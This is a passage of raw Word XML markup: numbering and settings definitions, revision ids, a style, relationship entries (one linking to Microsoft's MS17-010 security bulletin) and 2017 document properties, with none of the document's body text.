    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="3"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="1">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>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8"/>
  <w:hyphenationZone w:val="425"/>
  <w:characterSpacingControl w:val="doNotCompress"/>
  <w:hdrShapeDefaults>
    <o:shapedefaults v:ext="edit" spidmax="819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BC"/>
    <w:rsid w:val="00001745"/>
    <w:rsid w:val="000112A0"/>
    <w:rsid w:val="00027573"/>
    <w:rsid w:val="00046389"/>
    <w:rsid w:val="000510C6"/>
    <w:rsid w:val="0005250C"/>
    <w:rsid w:val="0005417B"/>
    <w:rsid w:val="000920B6"/>
    <w:rsid w:val="000A320F"/>
    <w:rsid w:val="000B23BF"/>
    <w:rsid w:val="000D17CB"/>
    <w:rsid w:val="000D7464"/>
    <w:rsid w:val="000E547A"/>
    <w:rsid w:val="000E6B21"/>
    <w:rsid w:val="000F0C10"/>
    <w:rsid w:val="000F1DC5"/>
    <w:rsid w:val="00112965"/>
    <w:rsid w:val="001279BD"/>
    <w:rsid w:val="0013062D"/>
    <w:rsid w:val="00132682"/>
    <w:rsid w:val="00132909"/>
    <w:rsid w:val="00133EDD"/>
    <w:rsid w:val="00151ECD"/>
    <w:rsid w:val="00154C09"/>
    <w:rsid w:val="00161132"/>
    <w:rsid w:val="00161777"/>
    <w:rsid w:val="001712C7"/>
    <w:rsid w:val="0017676B"/>
    <w:rsid w:val="001905B9"/>
    <w:rsid w:val="001A5C93"/>
    <w:rsid w:val="001C0BA6"/>
    <w:rsid w:val="001C0CB2"/>
    <w:rsid w:val="001D1620"/>
    <w:rsid w:val="001E3330"/>
    <w:rsid w:val="001F2976"/>
    <w:rsid w:val="0022030D"/>
    <w:rsid w:val="002371F6"/>
    <w:rsid w:val="00254AF1"/>
    <w:rsid w:val="00256944"/>
    <w:rsid w:val="0028659A"/>
    <w:rsid w:val="0028776D"/>
    <w:rsid w:val="00291FB1"/>
    <w:rsid w:val="00292E4A"/>
    <w:rsid w:val="002A7605"/>
    <w:rsid w:val="002B0FD1"/>
    <w:rsid w:val="002B7A98"/>
    <w:rsid w:val="002E1900"/>
    <w:rsid w:val="002E653A"/>
    <w:rsid w:val="002F5336"/>
    <w:rsid w:val="002F776C"/>
    <w:rsid w:val="0030070E"/>
    <w:rsid w:val="00301662"/>
    <w:rsid w:val="0031410B"/>
    <w:rsid w:val="0032326F"/>
    <w:rsid w:val="003363BE"/>
    <w:rsid w:val="00340E97"/>
    <w:rsid w:val="00341658"/>
    <w:rsid w:val="00351C72"/>
    <w:rsid w:val="00364162"/>
    <w:rsid w:val="00383F4F"/>
    <w:rsid w:val="0038524F"/>
    <w:rsid w:val="00394D3B"/>
    <w:rsid w:val="003A1321"/>
    <w:rsid w:val="003B009F"/>
    <w:rsid w:val="003C73E7"/>
    <w:rsid w:val="003C7753"/>
    <w:rsid w:val="003E29E2"/>
    <w:rsid w:val="003E63DD"/>
    <w:rsid w:val="003F0C17"/>
    <w:rsid w:val="003F4AE8"/>
    <w:rsid w:val="00404615"/>
    <w:rsid w:val="00410C6A"/>
    <w:rsid w:val="0043674B"/>
    <w:rsid w:val="0045005A"/>
    <w:rsid w:val="0046275C"/>
    <w:rsid w:val="00465585"/>
    <w:rsid w:val="00475402"/>
    <w:rsid w:val="00481CA9"/>
    <w:rsid w:val="00493395"/>
    <w:rsid w:val="004A08E2"/>
    <w:rsid w:val="004A221C"/>
    <w:rsid w:val="004A5876"/>
    <w:rsid w:val="004C1F06"/>
    <w:rsid w:val="004C514E"/>
    <w:rsid w:val="004C5DAB"/>
    <w:rsid w:val="004C6BF5"/>
    <w:rsid w:val="004D157E"/>
    <w:rsid w:val="004D3791"/>
    <w:rsid w:val="004D705C"/>
    <w:rsid w:val="004D7B3D"/>
    <w:rsid w:val="004E3329"/>
    <w:rsid w:val="004E733D"/>
    <w:rsid w:val="004F0323"/>
    <w:rsid w:val="004F0C68"/>
    <w:rsid w:val="004F2C3B"/>
    <w:rsid w:val="005033F7"/>
    <w:rsid w:val="00507BF0"/>
    <w:rsid w:val="005201BA"/>
    <w:rsid w:val="00527338"/>
    <w:rsid w:val="0053233E"/>
    <w:rsid w:val="00547C89"/>
    <w:rsid w:val="00574B53"/>
    <w:rsid w:val="00586BCC"/>
    <w:rsid w:val="005A0648"/>
    <w:rsid w:val="005B0B9D"/>
    <w:rsid w:val="005C4657"/>
    <w:rsid w:val="005D5E52"/>
    <w:rsid w:val="005E55CE"/>
    <w:rsid w:val="00600857"/>
    <w:rsid w:val="0062422C"/>
    <w:rsid w:val="0065524C"/>
    <w:rsid w:val="00665C65"/>
    <w:rsid w:val="006735A9"/>
    <w:rsid w:val="00682B37"/>
    <w:rsid w:val="00692399"/>
    <w:rsid w:val="006B38D2"/>
    <w:rsid w:val="006B70AD"/>
    <w:rsid w:val="006C4A5E"/>
    <w:rsid w:val="006C6590"/>
    <w:rsid w:val="006D6925"/>
    <w:rsid w:val="006E34CB"/>
    <w:rsid w:val="006E7C23"/>
    <w:rsid w:val="006F4799"/>
    <w:rsid w:val="006F4C01"/>
    <w:rsid w:val="00706443"/>
    <w:rsid w:val="00712DC9"/>
    <w:rsid w:val="007213B6"/>
    <w:rsid w:val="007379DF"/>
    <w:rsid w:val="007504C1"/>
    <w:rsid w:val="00762E36"/>
    <w:rsid w:val="00764D74"/>
    <w:rsid w:val="007673FA"/>
    <w:rsid w:val="00774F0F"/>
    <w:rsid w:val="007756CC"/>
    <w:rsid w:val="0078040C"/>
    <w:rsid w:val="00782D85"/>
    <w:rsid w:val="0078704C"/>
    <w:rsid w:val="00792A94"/>
    <w:rsid w:val="007C2FFC"/>
    <w:rsid w:val="007D7E00"/>
    <w:rsid w:val="007F5900"/>
    <w:rsid w:val="00800DF0"/>
    <w:rsid w:val="00801886"/>
    <w:rsid w:val="00801BA7"/>
    <w:rsid w:val="00811096"/>
    <w:rsid w:val="00833EA1"/>
    <w:rsid w:val="008368D3"/>
    <w:rsid w:val="00846817"/>
    <w:rsid w:val="0084791A"/>
    <w:rsid w:val="00857EDD"/>
    <w:rsid w:val="00865937"/>
    <w:rsid w:val="00866889"/>
    <w:rsid w:val="00874775"/>
    <w:rsid w:val="008750A3"/>
    <w:rsid w:val="00880C5A"/>
    <w:rsid w:val="00885904"/>
    <w:rsid w:val="008A101C"/>
    <w:rsid w:val="008A58E3"/>
    <w:rsid w:val="008B08AC"/>
    <w:rsid w:val="008B5917"/>
    <w:rsid w:val="008C2637"/>
    <w:rsid w:val="008F0E02"/>
    <w:rsid w:val="008F27B2"/>
    <w:rsid w:val="00900E4E"/>
    <w:rsid w:val="0091549F"/>
    <w:rsid w:val="00922077"/>
    <w:rsid w:val="0092418F"/>
    <w:rsid w:val="00927DC9"/>
    <w:rsid w:val="009525A9"/>
    <w:rsid w:val="009627B3"/>
    <w:rsid w:val="0096301D"/>
    <w:rsid w:val="00974F37"/>
    <w:rsid w:val="00977C19"/>
    <w:rsid w:val="009867EB"/>
    <w:rsid w:val="009924C9"/>
    <w:rsid w:val="009A241B"/>
    <w:rsid w:val="009A40B4"/>
    <w:rsid w:val="009C5438"/>
    <w:rsid w:val="009D0812"/>
    <w:rsid w:val="00A0582C"/>
    <w:rsid w:val="00A209D4"/>
    <w:rsid w:val="00A362BC"/>
    <w:rsid w:val="00A478E8"/>
    <w:rsid w:val="00A50E2A"/>
    <w:rsid w:val="00A556EF"/>
    <w:rsid w:val="00A60D20"/>
    <w:rsid w:val="00A62544"/>
    <w:rsid w:val="00A72A01"/>
    <w:rsid w:val="00A80B40"/>
    <w:rsid w:val="00A826B7"/>
    <w:rsid w:val="00A82C89"/>
    <w:rsid w:val="00AA1455"/>
    <w:rsid w:val="00AA3A25"/>
    <w:rsid w:val="00AA43DC"/>
    <w:rsid w:val="00AC000C"/>
    <w:rsid w:val="00AC0458"/>
    <w:rsid w:val="00AD59AD"/>
    <w:rsid w:val="00AE349C"/>
    <w:rsid w:val="00AE4E8C"/>
    <w:rsid w:val="00AE7B8C"/>
    <w:rsid w:val="00AF132C"/>
    <w:rsid w:val="00B028C7"/>
    <w:rsid w:val="00B05A54"/>
    <w:rsid w:val="00B52410"/>
    <w:rsid w:val="00B62B29"/>
    <w:rsid w:val="00B76596"/>
    <w:rsid w:val="00B94509"/>
    <w:rsid w:val="00BA4804"/>
    <w:rsid w:val="00BA7AE1"/>
    <w:rsid w:val="00BB05D6"/>
    <w:rsid w:val="00BC3A78"/>
    <w:rsid w:val="00BC43B3"/>
    <w:rsid w:val="00BC7FA6"/>
    <w:rsid w:val="00BD1E60"/>
    <w:rsid w:val="00BE292E"/>
    <w:rsid w:val="00BE6B72"/>
    <w:rsid w:val="00BE6E58"/>
    <w:rsid w:val="00C1109F"/>
    <w:rsid w:val="00C3458B"/>
    <w:rsid w:val="00C34786"/>
    <w:rsid w:val="00C5090A"/>
    <w:rsid w:val="00C545A5"/>
    <w:rsid w:val="00C57763"/>
    <w:rsid w:val="00CA5897"/>
    <w:rsid w:val="00CA73E4"/>
    <w:rsid w:val="00CC269F"/>
    <w:rsid w:val="00CD72C8"/>
    <w:rsid w:val="00CD79E1"/>
    <w:rsid w:val="00CE09C5"/>
    <w:rsid w:val="00CE13B3"/>
    <w:rsid w:val="00CF01E4"/>
    <w:rsid w:val="00CF4544"/>
    <w:rsid w:val="00D23CA3"/>
    <w:rsid w:val="00D3436B"/>
    <w:rsid w:val="00D40F41"/>
    <w:rsid w:val="00D51047"/>
    <w:rsid w:val="00D60EA5"/>
    <w:rsid w:val="00D76FA8"/>
    <w:rsid w:val="00D828F5"/>
    <w:rsid w:val="00D9718A"/>
    <w:rsid w:val="00DB3416"/>
    <w:rsid w:val="00DC186F"/>
    <w:rsid w:val="00DC50DF"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rsid w:val="00DF555A"/>
    <w:rsid w:val="00E076AA"/>
    <w:rsid w:val="00E17874"/>
    <w:rsid w:val="00E56045"/>
    <w:rsid w:val="00E747D3"/>
    <w:rsid w:val="00E76CF8"/>
    <w:rsid w:val="00E935C0"/>
    <w:rsid w:val="00EA0256"/>
    <w:rsid w:val="00EA104E"/>
    <w:rsid w:val="00EB0E11"/>
    <w:rsid w:val="00EC27F5"/>
    <w:rsid w:val="00EF5198"/>
    <w:rsid w:val="00F00345"/>
    <w:rsid w:val="00F004B6"/>
    <w:rsid w:val="00F12A52"/>
    <w:rsid w:val="00F21F43"/>
    <w:rsid w:val="00F23E6A"/>
    <w:rsid w:val="00F63B8B"/>
    <w:rsid w:val="00F662A3"/>
    <w:rsid w:val="00FC3B0B"/>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67C757B"/>
  <w15:docId w15:val="{9A75A6C3-13A7-4DB5-BD8B-073770D3A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132909"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="880"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
      </w:tabs>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
      <w:jc w:val="both"/>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microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.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C8EBCB65-F68D-4757-868A-633D5FBAE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296</TotalTime>
  <Pages>18</Pages>
  <Words>2312</Words>
  <Characters>13183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15465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Colin M</dc:creator>
  <cp:lastModifiedBy>Concord</cp:lastModifiedBy>
  <cp:revision>9</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-11-30T14:53:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-12-03T13:35:00Z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